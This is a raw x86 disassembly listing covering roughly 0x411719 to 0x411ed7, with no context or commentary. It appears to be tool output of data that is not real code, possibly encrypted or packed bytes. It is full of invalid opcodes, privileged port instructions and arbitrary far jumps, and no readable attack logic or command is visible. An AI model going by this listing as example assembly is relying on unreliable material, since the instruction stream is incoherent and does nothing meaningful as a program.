  411719:	pop    ecx
  41171a:	fild   WORD PTR [ecx+0x15]
  41171d:	inc    ebp
  41171e:	outs   dx,BYTE PTR ds:[esi]
  41171f:	idiv   BYTE PTR [edi+0x2f]
  411722:	retf   
  411723:	pop    es
  411724:	mov    ch,0xe
  411726:	and    eax,0xe16d3d47
  41172b:	mov    esp,0xc05b9ba
  411730:	add    DWORD PTR [esi],esi
  411732:	sbb    edi,DWORD PTR [edi+eax*8]
  411735:	ins    DWORD PTR es:[edi],dx
  411736:	cmp    eax,0xd9d307f7
  41173b:	xchg   ebp,eax
  41173c:	and    dl,BYTE PTR [ebx]
  41173e:	cmp    dl,BYTE PTR [ebx+ebp*2]
  411741:	jmp    DWORD PTR [edx+0x641c077d]
  411747:	mov    dl,0x86
  411749:	xor    cl,0xe4
  41174c:	mov    ds:0xe58af044,eax
  411751:	popa   
  411752:	not    BYTE PTR [ebp+0x4f8f4777]
  411758:	imul   esi,edx,0x99a282c9
  41175e:	xchg   esi,eax
  41175f:	jnp    0x411723
  411761:	xchg   esp,eax
  411762:	dec    edi
  411763:	mov    eax,ds:0xbc8f4eb7
  411768:	cmp    dl,BYTE PTR [edx+0x5ec2df7a]
  41176e:	xor    bl,bh
  411770:	pop    edx
  411771:	jnp    0x4117bd
  411773:	imul   edx,eax,0x3ce1a824
  411779:	push   cs
  41177a:	inc    edx
  41177b:	dec    esi
  41177c:	lods   eax,DWORD PTR ds:[esi]
  41177d:	dec    edx
  41177e:	pop    edi
  41177f:	lds    esi,FWORD PTR [edx-0xe9f5544]
  411785:	inc    ecx
  411786:	sbb    DWORD PTR [edi-0x61],0xfe42690c
  41178d:	in     eax,0x30
  41178f:	popa   
  411790:	fwait
  411791:	in     al,0x10
  411793:	inc    ebx
  411794:	imul   edx,ebp,0xffffffba
  411797:	jmp    0x30a5:0xfc2f5684
  41179e:	jae    0x411742
  4117a0:	test   al,0x6c
  4117a2:	idiv   BYTE PTR [edx-0x3e5b3ea4]
  4117a8:	inc    ecx
  4117a9:	fadd   DWORD PTR [edx]
  4117ab:	gs adc esp,edx
  4117ae:	pop    edi
  4117af:	mov    ecx,0xc542be27
  4117b4:	cmc    
  4117b5:	or     esi,eax
  4117b7:	(bad)  
  4117b8:	lock pushf 
  4117ba:	cli    
  4117bb:	stos   BYTE PTR es:[edi],al
  4117bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117bd:	mov    edi,0x146e953d
  4117c2:	mov    dl,0xdd
  4117c4:	lea    edi,[ecx-0x22d879c7]
  4117ca:	jnp    0x411792
  4117cc:	fsubr  DWORD PTR [edx]
  4117ce:	loop   0x4117d3
  4117d0:	test   dl,0x95
  4117d3:	shr    DWORD PTR [edi+0x65e8a7f9],1
  4117d9:	dec    esp
  4117da:	outs   dx,BYTE PTR ds:[esi]
  4117db:	sahf   
  4117dc:	ret    
  4117dd:	jecxz  0x41185d
  4117df:	mov    dl,0xa8
  4117e1:	or     DWORD PTR [ebx],esi
  4117e3:	sbb    eax,0x4a438f94
  4117e8:	mov    ch,0x54
  4117ea:	cmc    
  4117eb:	dec    ebp
  4117ec:	(bad)  
  4117ed:	sbb    ecx,DWORD PTR [eax-0x3d4c1067]
  4117f3:	in     al,dx
  4117f4:	iret   
  4117f5:	xor    al,0x95
  4117f7:	mov    bh,0xe8
  4117f9:	lods   eax,DWORD PTR ds:[esi]
  4117fa:	adc    al,0x51
  4117fc:	lea    ebx,[edx]
  4117fe:	pop    eax
  4117ff:	mov    bh,0x8b
  411801:	pushf  
  411802:	hlt    
  411803:	jl     0x411830
  411805:	xchg   esp,eax
  411806:	mov    edx,0x98f5d714
  41180b:	xor    ch,BYTE PTR [ecx-0x1982f6e4]
  411811:	push   cs
  411812:	loop   0x411797
  411814:	pop    edi
  411815:	inc    eax
  411816:	(bad)
  41181a:	dec    BYTE PTR [edx]
  41181c:	sbb    edi,DWORD PTR [esi]
  41181e:	jmp    0x1cb88135
  411823:	mov    ebp,0xae81ed6f
  411828:	mov    ebx,DWORD PTR [ebx-0x65]
  41182b:	adc    eax,0x7f93f825
  411830:	jae    0x411873
  411832:	ret    
  411833:	pop    ss
  411834:	sub    eax,0x5776981d
  411839:	aaa    
  41183a:	xchg   esp,eax
  41183b:	test   BYTE PTR [edi],cl
  41183d:	dec    edi
  41183e:	aas    
  41183f:	rol    edx,cl
  411841:	pop    ss
  411842:	mov    ebp,0xc5afbafa
  411847:	jo     0x411823
  411849:	push   ds
  41184a:	or     al,0xbd
  41184c:	iret   
  41184d:	add    al,0xbf
  41184f:	popa   
  411850:	jecxz  0x4117d2
  411852:	mov    DWORD PTR [ebx+0x491ae97f],edx
  411858:	push   es
  411859:	mov    ebp,0x96a4c4ec
  41185e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41185f:	pop    ebx
  411860:	fnstenv [esi+edi*2+0x3e]
  411864:	sbb    eax,0xfab1acde
  411869:	xchg   esp,eax
  41186a:	push   cs
  41186b:	call   DWORD PTR [esi+0x698ba0c1]
  411871:	call   0xb36f1d55
  411876:	icebp  
  411877:	mov    al,ds:0xcbd5bebd
  41187c:	rcl    BYTE PTR [edx+0x4b],cl
  41187f:	mov    dl,0x3e
  411881:	cmp    dl,al
  411883:	scas   al,BYTE PTR es:[edi]
  411884:	dec    ebx
  411885:	(bad)  
  411886:	call   0xebb4466e
  41188b:	call   0xfb4374b6
  411890:	mov    esp,0xd2f182ed
  411895:	jge    0x4118dc
  411897:	es fs arpl bx,bp
  41189b:	fild   QWORD PTR [esi+eax*1-0x40f0a2e5]
  4118a2:	push   ds
  4118a3:	jge    0x4118d8
  4118a5:	pop    DWORD PTR [ebx+0x3a3eba0b]
  4118ab:	sub    ch,bh
  4118ad:	adc    edi,edi
  4118af:	inc    edi
  4118b0:	jno    0x411895
  4118b2:	inc    ebp
  4118b3:	out    0x83,eax
  4118b5:	pop    es
  4118b6:	mov    ch,BYTE PTR [edx]
  4118b8:	push   cs
  4118b9:	imul   BYTE PTR [ebp-0x53]
  4118bc:	loop   0x41192d
  4118be:	lock push ebx
  4118c0:	mov    edx,0x600fb596
  4118c5:	or     edi,DWORD PTR [eax-0xedb8b6f]
  4118cb:	sub    al,0x69
  4118cd:	aaa    
  4118ce:	jmp    0x4c88e44
  4118d3:	and    al,BYTE PTR [esi-0x64]
  4118d6:	call   DWORD PTR [edx]
  4118d8:	ret    0xa0d9
  4118db:	stos   DWORD PTR es:[edi],eax
  4118dc:	gs js  0x4118b4
  4118df:	(bad)  
  4118e0:	jno    0x4118f5
  4118e2:	jle    0x4118e4
  4118e4:	in     al,dx
  4118e5:	shl    BYTE PTR [esi-0x282aa0a7],0x32
  4118ec:	mov    dl,0x29
  4118ee:	cmc    
  4118ef:	das    
  4118f0:	jge    0x411927
  4118f2:	push   ss
  4118f3:	dec    esi
  4118f4:	add    al,0xa
  4118f6:	or     BYTE PTR [eax],cl
  4118f8:	arpl   WORD PTR [ebx-0x10394951],dx
  4118fe:	stc    
  4118ff:	xchg   ecx,eax
  411900:	das    
  411901:	fwait
  411902:	dec    edi
  411903:	jmp    0x3c31:0xc5fa8795
  41190a:	sub    BYTE PTR [ebx+0x5d],0xdf
  41190e:	pop    esp
  41190f:	cld    
  411910:	mov    al,ds:0x7bd9dad
  411915:	fadd   DWORD PTR [esi]
  411917:	in     eax,0x52
  411919:	dec    eax
  41191a:	sub    al,0x82
  41191c:	js     0x411972
  41191e:	out    dx,eax
  41191f:	push   cs
  411920:	sar    BYTE PTR [ebx+0xc5032ac],0x6f
  411927:	cmp    eax,0xf1422aa6
  41192c:	iret   
  41192d:	jmp    0x86e4:0x3a780475
  411934:	dec    ecx
  411935:	mov    esp,0x5b818a65
  41193a:	xchg   esi,eax
  41193b:	push   ebx
  41193c:	sahf   
  41193d:	mov    edx,0x50157725
  411942:	cwde   
  411943:	sub    al,0x4e
  411945:	arpl   WORD PTR [edx-0x63],sp
  411948:	shl    esi,0x5b
  41194b:	out    0x38,eax
  41194d:	adc    DWORD PTR [edi],0xebbf923d
  411953:	inc    edx
  411954:	cs xchg edx,eax
  411956:	ficomp DWORD PTR [edx]
  411958:	out    dx,al
  411959:	cmp    edi,ebx
  41195b:	fist   DWORD PTR ds:0x2481
  411960:	ins    DWORD PTR es:[edi],dx
  411961:	add    esp,DWORD PTR [esi-0x7ee582c7]
  411967:	dec    esi
  411968:	mov    esp,0xd91bf99a
  41196d:	cmp    DWORD PTR [eax],0xffffff95
  411970:	mov    bh,0x76
  411972:	lds    edi,FWORD PTR [edx]
  411974:	jecxz  0x41192b
  411976:	mov    esp,0x6d10c955
  41197b:	push   ecx
  41197c:	pop    ebp
  41197d:	xchg   esp,eax
  41197e:	aas    
  41197f:	aas    
  411980:	cdq    
  411981:	pusha  
  411982:	add    eax,0x6581c544
  411987:	xchg   eax,esp
  411989:	add    esp,edx
  41198b:	sar    DWORD PTR [ebp+0x12],1
  41198e:	sub    eax,0xc3b9585
  411993:	mov    eax,ds:0x850b8d43
  411998:	mov    cl,0x88
  41199a:	mov    dh,0x30
  41199c:	xchg   ch,al
  41199e:	jmp    0x44e:0xe30af03f
  4119a5:	cmp    al,0x73
  4119a7:	fmul   DWORD PTR [edx+0x51]
  4119aa:	sbb    BYTE PTR [edi-0x6b8b8837],ah
  4119b0:	mov    ch,0x16
  4119b2:	test   al,0x71
  4119b4:	das    
  4119b5:	push   ebp
  4119b6:	sub    al,al
  4119b8:	cwde   
  4119b9:	loopne 0x4119ac
  4119bb:	rcr    BYTE PTR [ebx+0x480f1ae7],cl
  4119c1:	ja     0x4119e7
  4119c3:	dec    esp
  4119c4:	lods   al,BYTE PTR ds:[esi]
  4119c5:	xor    al,0xd1
  4119c8:	fsub   st,st(1)
  4119ca:	in     al,0xaa
  4119cc:	xchg   esp,eax
  4119cd:	xor    ebp,ebp
  4119cf:	xchg   ebx,eax
  4119d0:	cld    
  4119d1:	add    al,0xbe
  4119d3:	mov    ds:0xfa89f8aa,eax
  4119d8:	fcomp  DWORD PTR [ecx-0x19]
  4119db:	(bad)
  4119df:	call   0xeed008c0
  4119e4:	dec    ecx
  4119e5:	dec    ebp
  4119e6:	pop    edi
  4119e7:	mov    ecx,edi
  4119e9:	call   0xd18d16bb
  4119ee:	ficomp DWORD PTR [ebx-0x43a8af0a]
  4119f4:	scas   al,BYTE PTR es:[edi]
  4119f5:	ins    DWORD PTR es:[edi],dx
  4119f6:	call   0x86e4:0x176d3a8b
  4119fd:	aad    0xf0
  4119ff:	data16 int 0x8a
  411a02:	daa    
  411a03:	pop    ebp
  411a04:	leave  
  411a05:	enter  0x6fac,0xb4
  411a09:	sbb    BYTE PTR [ebp-0x18],ah
  411a0c:	jge    0x4119d6
  411a0e:	mov    esp,0xa4d82beb
  411a13:	xchg   bl,bl
  411a15:	not    DWORD PTR [eax+0x36]
  411a18:	imul   edi,DWORD PTR [eax+0x12],0x74
  411a1c:	push   ds
  411a1d:	cmc    
  411a1e:	outs   dx,DWORD PTR ds:[esi]
  411a1f:	test   al,0x5a
  411a21:	pop    esp
  411a22:	fimul  DWORD PTR [ebx]
  411a24:	pop    edx
  411a25:	jbe    0x411aa5
  411a27:	pxor   mm3,QWORD PTR [edi+0x5b]
  411a2b:	sbb    BYTE PTR [eax-0x31],dl
  411a2e:	push   edi
  411a2f:	xlat   BYTE PTR ds:[ebx]
  411a30:	mov    DWORD PTR ds:0xf2852412,edi
  411a36:	sub    DWORD PTR [eax+0x60],0xffffffa1
  411a3a:	inc    eax
  411a3b:	push   cs
  411a3c:	fcomp  QWORD PTR [ecx]
  411a3e:	pop    ecx
  411a3f:	cli    
  411a40:	cwde   
  411a41:	jns    0x4119d8
  411a43:	jg     0x4119ef
  411a45:	add    eax,0xf1b6939
  411a4a:	dec    ebx
  411a4b:	inc    ebp
  411a4c:	jmp    0x9c446197
  411a51:	dec    ebx
  411a52:	pusha  
  411a53:	inc    esi
  411a54:	pusha  
  411a55:	retf   
  411a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a57:	xlat   BYTE PTR ds:[ebx]
  411a58:	xchg   edi,eax
  411a59:	dec    esp
  411a5a:	add    al,0xc3
  411a5c:	daa    
  411a5d:	adc    eax,0x7c52a54
  411a62:	sar    DWORD PTR [esi-0x8],0xe8
  411a66:	in     eax,0xd9
  411a68:	adc    eax,0x5d689ef4
  411a6d:	sbb    esp,ebp
  411a6f:	test   eax,0x596cafd2
  411a74:	clc    
  411a75:	stos   DWORD PTR es:[edi],eax
  411a76:	iret   
  411a77:	and    eax,0x3e33a473
  411a7c:	dec    esp
  411a7d:	iret   
  411a7e:	sub    ebx,esp
  411a80:	xor    eax,0xc8b90eb2
  411a85:	scas   eax,DWORD PTR es:[edi]
  411a86:	inc    edi
  411a87:	in     al,dx
  411a88:	popf   
  411a89:	pop    ecx
  411a8a:	aad    0x2b
  411a8c:	add    ebp,DWORD PTR ds:0x66dc13d6
  411a92:	sub    DWORD PTR [ebx],0xffffffdb
  411a95:	mov    ch,0x6e
  411a97:	sub    dh,bl
  411a99:	xor    ch,BYTE PTR [ebx+0x72]
  411a9c:	je     0x411a42
  411a9e:	mov    al,ds:0x9158e5be
  411aa3:	mov    dh,0xfa
  411aa5:	cs push ds
  411aa7:	cmp    al,0x46
  411aa9:	xlat   BYTE PTR ds:[ebx]
  411aaa:	xchg   DWORD PTR [ebx+0x19b39e5c],ebp
  411ab0:	dec    edx
  411ab1:	stos   DWORD PTR es:[edi],eax
  411ab2:	mov    cl,0x4a
  411ab4:	scas   al,BYTE PTR es:[edi]
  411ab5:	cld    
  411ab6:	cmp    BYTE PTR [eax+0x24],bh
  411ab9:	shl    BYTE PTR [ecx+0x36e698a],cl
  411abf:	cli    
  411ac0:	loopne 0x411b16
  411ac2:	and    ebx,DWORD PTR [ecx]
  411ac4:	pop    esp
  411ac5:	sahf   
  411ac6:	xchg   edi,eax
  411ac7:	xchg   edx,eax
  411ac8:	jno    0x411a7f
  411aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411acb:	pop    ebp
  411acc:	enter  0xbfed,0x8a
  411ad0:	xor    BYTE PTR [edx-0x76],dl
  411ad3:	sbb    bh,BYTE PTR [edi-0x4f]
  411ad6:	mov    esp,0x87f5948d
  411adb:	xchg   DWORD PTR ds:0xfe21a3cb,ecx
  411ae1:	jl     0x411ac3
  411ae3:	xlat   BYTE PTR ds:[ebx]
  411ae4:	jbe    0x411b54
  411ae6:	bound  edx,QWORD PTR ds:0x4dfebf39
  411aec:	adc    ebx,esp
  411aee:	cmp    al,0xbe
  411af0:	adc    al,BYTE PTR [edi+0x1]
  411af3:	sbb    ebp,edi
  411af5:	stc    
  411af6:	mov    dh,0xd6
  411af8:	or     ch,BYTE PTR ds:0xec343c3c
  411afe:	mov    edx,0xfa4c213
  411b03:	rcr    ecx,1
  411b05:	lea    edx,[edx-0x2]
  411b08:	push   0xa9567ed4
  411b0d:	mov    ebx,0x29a07cff
  411b12:	xchg   edx,eax
  411b13:	and    edi,DWORD PTR [ebp+eax*4-0x4d]
  411b17:	add    al,0xb0
  411b19:	dec    esi
  411b1a:	bound  edx,QWORD PTR [ebx+0x5965414d]
  411b20:	lahf   
  411b21:	inc    ebx
  411b22:	out    0xc1,al
  411b24:	sbb    BYTE PTR [eax],dl
  411b26:	add    eax,0x55533456
  411b2b:	inc    edx
  411b2c:	adc    edx,DWORD PTR cs:[ecx]
  411b2f:	jo     0x411b96
  411b31:	lods   al,BYTE PTR ds:[esi]
  411b32:	mov    cl,0xed
  411b34:	mov    bh,0x91
  411b36:	and    eax,ebp
  411b38:	mov    cl,0xdf
  411b3a:	push   0xffffffd7
  411b3c:	pop    edx
  411b3d:	jmp    0x925691f6
  411b42:	pusha  
  411b43:	pop    edx
  411b44:	sbb    ebp,0x1
  411b47:	add    BYTE PTR [edi+0x1fc1bc3a],cl
  411b4d:	sub    eax,0x1e108ea9
  411b52:	enter  0x1862,0x28
  411b56:	neg    DWORD PTR [ebp-0x3bba7e09]
  411b5c:	mov    ch,0xe5
  411b5e:	pop    esi
  411b5f:	push   ss
  411b60:	dec    ebp
  411b61:	(bad)  
  411b62:	xchg   ebx,eax
  411b63:	sbb    eax,0x55fad43a
  411b68:	sub    eax,0x4e88c930
  411b6d:	test   DWORD PTR [ebx],edx
  411b6f:	test   al,0xe7
  411b71:	popf   
  411b72:	inc    esp
  411b73:	call   0x5282652c
  411b78:	mov    bh,0x17
  411b7a:	fstp   DWORD PTR [eax-0x73]
  411b7d:	add    ebx,DWORD PTR [ebp+0x228e240]
  411b83:	sbb    DWORD PTR [ecx],ebx
  411b85:	pop    edi
  411b86:	sub    bl,BYTE PTR [ebx*8-0x4c0ae083]
  411b8d:	cmp    bh,bl
  411b8f:	in     al,0xa3
  411b91:	xchg   DWORD PTR ds:0x5950b781,edx
  411b97:	dec    ecx
  411b98:	jmp    0x4120a3
  411b9d:	rcl    bh,0xcd
  411ba0:	(bad)  
  411ba1:	int    0xc6
  411ba3:	xlat   BYTE PTR ds:[ebx]
  411ba4:	aad    0xef
  411ba6:	sahf   
  411ba7:	mov    esi,0x683fd966
  411bac:	stc    
  411bad:	sar    BYTE PTR [eax+0x7f],1
  411bb0:	js     0x411c1c
  411bb2:	jl     0x411c2c
  411bb4:	js     0x411c2d
  411bb6:	out    0x8f,eax
  411bb8:	add    BYTE PTR [ecx+0x51a097ae],ch
  411bbe:	shl    DWORD PTR [edx-0x10],cl
  411bc1:	int3   
  411bc2:	lods   eax,DWORD PTR ds:[esi]
  411bc3:	push   eax
  411bc4:	aaa    
  411bc5:	sub    ebp,0x54
  411bc8:	push   ebx
  411bc9:	ja     0x411c04
  411bcb:	hlt    
  411bcc:	xchg   ecx,eax
  411bcd:	mov    WORD PTR [eax-0x64813da6],gs
  411bd3:	retf   0xc705
  411bd6:	aad    0xab
  411bd8:	cmp    BYTE PTR cs:0x98723fed,0x6c
  411be0:	dec    esi
  411be1:	pop    edx
  411be2:	leave  
  411be3:	fist   DWORD PTR [edx]
  411be5:	ss (bad) 
  411be7:	out    dx,al
  411be8:	jne    0x411b93
  411bea:	sbb    eax,0xebb6ec90
  411bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf0:	loop   0x411b7a
  411bf2:	in     al,dx
  411bf3:	xchg   ebp,eax
  411bf4:	ja     0x411bfd
  411bf6:	stc    
  411bf7:	repz arpl WORD PTR [edi+0x39],ax
  411bfb:	jnp    0x411c04
  411bfd:	mov    dh,0xd0
  411bff:	leave  
  411c00:	pop    ebx
  411c01:	inc    esi
  411c02:	(bad)  
  411c03:	lods   al,BYTE PTR ds:[esi]
  411c04:	fild   QWORD PTR [esi*8+0x19bfa433]
  411c0b:	jecxz  0x411bf8
  411c0d:	dec    ebx
  411c0e:	add    al,0xff
  411c10:	cld    
  411c11:	cs sub eax,0x89a74f23
  411c17:	(bad)  
  411c19:	and    al,0xde
  411c1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c1c:	(bad)  
  411c1d:	or     al,0x43
  411c1f:	adc    ah,BYTE PTR [esi-0x55]
  411c22:	lds    esi,FWORD PTR [eax]
  411c24:	clc    
  411c25:	mov    esi,0xbd3a971b
  411c2a:	mov    al,ds:0x1fb46c72
  411c2f:	call   0x644a767
  411c34:	xor    ecx,edx
  411c36:	fadd   st,st(0)
  411c38:	adc    ah,BYTE PTR [esi+eax*2]
  411c3b:	mov    eax,ds:0x8ff99ff4
  411c40:	punpcklwd mm0,mm0
  411c43:	mov    eax,ds:0xd1f2d32b
  411c48:	push   esp
  411c49:	daa    
  411c4a:	jne    0x411cbd
  411c4c:	and    edi,DWORD PTR [ebp+0x502319c6]
  411c52:	xchg   ecx,eax
  411c53:	call   0x8c07849d
  411c58:	out    dx,eax
  411c59:	pushf  
  411c5a:	inc    eax
  411c5b:	iret   
  411c5c:	jb     0x411c6d
  411c5e:	sub    DWORD PTR [ecx],eax
  411c60:	add    al,0x5
  411c62:	xchg   BYTE PTR [eax],bl
  411c64:	aaa    
  411c65:	sub    DWORD PTR [eax+0x48],edi
  411c68:	test   BYTE PTR [edi-0x16],bl
  411c6b:	mov    eax,ds:0x981c92aa
  411c70:	dec    edi
  411c71:	out    dx,al
  411c72:	adc    al,BYTE PTR [ebx]
  411c74:	mov    ebx,DWORD PTR [ecx+0x75730193]
  411c7a:	mov    eax,es:0x313046ea
  411c80:	jne    0x411cad
  411c82:	mov    ss,WORD PTR [ebx-0x35]
  411c85:	sub    bh,BYTE PTR [ebx+eiz*4]
  411c88:	out    dx,eax
  411c89:	add    eax,0xc02d81d8
  411c8e:	lock sub BYTE PTR [esi+0x7d],cl
  411c92:	xor    esi,eax
  411c94:	retf   
  411c95:	adc    bh,dl
  411c97:	popa   
  411c98:	adc    edx,ecx
  411c9a:	imul   ebp,DWORD PTR [edi+edx*2],0x665a219d
  411ca1:	xchg   ecx,eax
  411ca2:	cmp    bl,BYTE PTR [ebx+edx*1+0x2b1fdc79]
  411ca9:	push   edi
  411caa:	mov    esp,0x1a966ecf
  411caf:	add    DWORD PTR [ebp+esi*2+0x79],0x1b7ef4b2
  411cb7:	and    DWORD PTR [ebx],edi
  411cb9:	cs and eax,0xe378690f
  411cbf:	jp     0x411c71
  411cc1:	mov    bl,0x7b
  411cc3:	mov    bh,0xf3
  411cc5:	shl    ecx,1
  411cc7:	(bad)  
  411cc8:	mov    ah,0xdf
  411cca:	mov    ebp,0x48ba30a3
  411ccf:	int    0xa1
  411cd1:	clc    
  411cd2:	je     0x411c64
  411cd4:	(bad)  
  411cd6:	call   FWORD PTR [ecx-0x1cdf78c8]
  411cdc:	ins    DWORD PTR es:[edi],dx
  411cdd:	test   eax,0xa37ce6e5
  411ce2:	fisubr WORD PTR [esi+0x64283fce]
  411ce8:	loope  0x411c96
  411cea:	add    al,0x19
  411cec:	popa   
  411ced:	inc    bx
  411cef:	out    dx,eax
  411cf0:	push   edi
  411cf1:	retf   
  411cf2:	in     al,dx
  411cf3:	aad    0x0
  411cf5:	and    DWORD PTR [esi],edx
  411cf7:	in     al,dx
  411cf8:	icebp  
  411cf9:	inc    eax
  411cfa:	ret    
  411cfb:	loopne 0x411ceb
  411cfd:	or     BYTE PTR fs:[eax+0x75],dh
  411d01:	adc    al,0xcd
  411d03:	pop    ds
  411d04:	push   ecx
  411d05:	add    DWORD PTR [esi+0x5e],edx
  411d08:	xor    al,0x37
  411d0a:	aas    
  411d0b:	push   eax
  411d0c:	bound  esi,QWORD PTR [ecx]
  411d0e:	iret   
  411d0f:	xor    al,0x10
  411d11:	test   al,0xa8
  411d13:	jmp    0x29c5:0x8b077afa
  411d1a:	dec    edx
  411d1b:	cmp    al,0x28
  411d1d:	xor    DWORD PTR gs:[esi-0xb],ebx
  411d21:	push   ebx
  411d22:	or     DWORD PTR ds:0x15e0eaf3,esp
  411d28:	xor    eax,0xb6c4ecb4
  411d2d:	out    dx,eax
  411d2e:	jge    0x411d14
  411d30:	pushf  
  411d31:	(bad)  
  411d32:	pop    ebx
  411d33:	push   eax
  411d34:	push   ecx
  411d35:	add    ebx,ebp
  411d37:	retf   
  411d38:	arpl   WORD PTR [ebp+0x215783a2],ax
  411d3e:	hlt    
  411d3f:	jae    0x411cc8
  411d41:	fldcw  WORD PTR [ecx]
  411d43:	scas   al,BYTE PTR es:[edi]
  411d44:	shl    ecx,cl
  411d46:	sub    eax,0xc0628c47
  411d4b:	adc    DWORD PTR [ebx-0x6c],edx
  411d4e:	js     0x411cf1
  411d50:	shl    BYTE PTR ds:0x791af89d,0xb3
  411d57:	pop    ss
  411d58:	ror    BYTE PTR [ebp+0x3b],1
  411d5b:	sbb    esp,edi
  411d5d:	sub    BYTE PTR [eax+0x518a7bae],al
  411d63:	push   0x6e
  411d65:	and    esi,DWORD PTR [edx-0x4abfcfba]
  411d6b:	push   esp
  411d6c:	out    0x87,al
  411d6e:	data16 sub al,0xb5
  411d71:	push   esp
  411d72:	cwde   
  411d73:	(bad)  
  411d74:	xor    DWORD PTR [eax],edx
  411d76:	xchg   ebp,eax
  411d77:	jmp    0x411dad
  411d79:	mov    ah,0x9f
  411d7b:	lods   al,BYTE PTR ds:[esi]
  411d7c:	sbb    eax,0xef53d456
  411d81:	xor    bl,dl
  411d83:	jae    0x411dd2
  411d85:	adc    eax,0x651274c0
  411d8a:	adc    esp,esp
  411d8c:	loope  0x411d8a
  411d8e:	pop    ss
  411d8f:	mov    ah,0x51
  411d91:	xchg   ebx,eax
  411d92:	lahf   
  411d93:	in     eax,0x3c
  411d95:	popf   
  411d96:	mov    es,WORD PTR [ebx-0x485ee150]
  411d9c:	mov    edi,0xfb270fbd
  411da1:	pop    es
  411da2:	popa   
  411da3:	add    edx,ebx
  411da5:	jno    0x411de3
  411da7:	jnp    0x411d44
  411da9:	(bad)  
  411dab:	test   BYTE PTR [eax],cl
  411dad:	stos   DWORD PTR es:[edi],eax
  411dae:	push   esi
  411daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db0:	icebp  
  411db1:	push   0xfffffff0
  411db3:	shr    BYTE PTR [esi],0x26
  411db6:	sub    ecx,DWORD PTR [ecx]
  411db8:	add    ch,BYTE PTR [edi+0xb]
  411dbb:	adc    ebx,DWORD PTR [edx-0x36]
  411dbe:	adc    ebp,eax
  411dc0:	loope  0x411d46
  411dc2:	inc    edi
  411dc3:	les    ebp,FWORD PTR [ebp-0x1292e86a]
  411dc9:	sub    eax,0xa25481be
  411dce:	mov    ah,0x2
  411dd0:	add    eax,0xef9872e0
  411dd5:	lock jmp 0x360979d7
  411ddb:	add    ch,BYTE PTR [ebx-0x3e576f49]
  411de1:	push   esi
  411de2:	(bad)  [eax+0x70]
  411de5:	jecxz  0x411dca
  411de7:	push   esp
  411de8:	enter  0x4a5b,0xe5
  411dec:	fldcw  WORD PTR [esi+0x4b332aa9]
  411df2:	xchg   DWORD PTR [ebx+edx*1],ebp
  411df5:	push   ebp
  411df6:	jmp    0x8864:0x846b8f57
  411dfd:	sbb    DWORD PTR [esi+0x4e],ecx
  411e00:	pop    ds
  411e01:	outs   dx,DWORD PTR ds:[esi]
  411e02:	stos   DWORD PTR es:[edi],eax
  411e03:	adc    ecx,ebp
  411e05:	push   0x49
  411e07:	pop    eax
  411e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e09:	into   
  411e0a:	push   es
  411e0b:	dec    ebx
  411e0c:	enter  0x170f,0xc3
  411e10:	dec    esi
  411e11:	pop    ecx
  411e12:	sub    eax,0x15d3c9b9
  411e17:	mov    edi,0xe68ca6e4
  411e1c:	adc    eax,0xd1b15889
  411e21:	adc    edi,eax
  411e23:	pusha  
  411e24:	mov    DWORD PTR [edx-0x25],esp
  411e27:	cli    
  411e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e2a:	mov    bh,0xf6
  411e2c:	mov    bh,ah
  411e2e:	xor    ch,ch
  411e30:	lods   eax,DWORD PTR ds:[esi]
  411e31:	div    ecx
  411e33:	cmc    
  411e34:	outs   dx,BYTE PTR ds:[esi]
  411e35:	pop    ebx
  411e36:	stos   DWORD PTR es:[edi],eax
  411e37:	mov    dl,0x11
  411e39:	imul   ebx,DWORD PTR [eax],0xb6081ba4
  411e3f:	inc    ebp
  411e40:	test   DWORD PTR [edi-0x12010b22],ebp
  411e46:	psrlq  mm3,QWORD PTR [ecx]
  411e49:	push   ebp
  411e4a:	(bad)  
  411e4b:	jb     0x411e09
  411e4d:	adc    al,0x39
  411e4f:	adc    DWORD PTR [ebx-0x39],esi
  411e52:	pop    es
  411e53:	add    BYTE PTR [ebx-0x48fa0a25],al
  411e59:	adc    eax,0x622c504
  411e5e:	cmp    eax,0xe13ec7bf
  411e63:	out    0xbe,eax
  411e65:	stos   BYTE PTR es:[edi],al
  411e66:	test   ecx,edi
  411e68:	and    DWORD PTR [ecx-0x4d159a1a],0x18f0ce9d
  411e72:	adc    DWORD PTR [ecx+0x4f],ebx
  411e75:	or     DWORD PTR [edi+0x3],ebp
  411e78:	js     0x411e0a
  411e7a:	or     bl,BYTE PTR [ecx+0x26]
  411e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e7e:	mov    ebp,0x286b1563
  411e83:	xor    esi,ebx
  411e85:	or     DWORD PTR [esi],eax
  411e87:	sti    
  411e88:	mov    dl,0xcb
  411e8a:	sar    BYTE PTR [ebx-0x1e97182e],0xf3
  411e91:	xlat   BYTE PTR ds:[ebx]
  411e92:	pop    ds
  411e93:	(bad)  
  411e94:	ror    bh,1
  411e96:	in     eax,dx
  411e97:	cmp    ebp,DWORD PTR [ebp+ebp*1-0x5ad05d68]
  411e9e:	es mov cl,0xae
  411ea1:	fwait
  411ea2:	jne    0x411e29
  411ea4:	popa   
  411ea5:	jne    0x411e49
  411ea7:	dec    eax
  411ea8:	lods   eax,DWORD PTR ds:[esi]
  411ea9:	retf   
  411eaa:	out    dx,eax
  411eab:	jmp    0x96077b36
  411eb0:	or     al,0xb0
  411eb2:	or     ah,bh
  411eb4:	xchg   esp,eax
  411eb5:	lods   al,BYTE PTR ds:[esi]
  411eb6:	repz add BYTE PTR [edi+0x7e],dl
  411eba:	sti    
  411ebb:	lods   al,BYTE PTR ds:[esi]
  411ebc:	or     esi,DWORD PTR [edi-0x246c0284]
  411ec2:	mov    eax,ds:0x5b58e0f4
  411ec7:	xor    esp,ebp
  411ec9:	jmp    0x411e5a
  411ecb:	inc    ebx
  411ecc:	lods   al,BYTE PTR ds:[esi]
  411ecd:	out    0xef,eax
  411ecf:	or     eax,0xbecfae71
  411ed4:	retf   0xf857
  411ed7:	dec    edi
